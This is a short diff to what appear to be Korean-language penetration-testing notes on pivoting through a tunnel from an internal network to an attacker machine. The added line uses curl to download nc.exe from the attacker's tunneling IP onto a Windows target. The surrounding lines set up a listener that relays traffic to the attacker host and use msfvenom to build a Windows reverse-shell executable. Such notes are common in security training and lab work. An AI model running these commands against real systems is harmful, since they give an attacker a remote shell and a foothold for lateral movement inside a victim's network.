@@ -19,6 +19,9 @@ session
 # 내부망에서 외부망으로 패킷 전달
 listener_add --addr <tunneling ip>:8888 --to <lhost>:80
 ```
+```powershell
+curl http://<tunneling ip>:8888/nc.exe -o c:\temp\nc.exe
+```
 ```bash
 # 터널링 된 ip로 연결하면 외부망으로 연결 됨.
 msfvenom -p windows/shell_reverse_tcp lhost=<tunneling ip> lport=8888 -f exe -o shell.exe
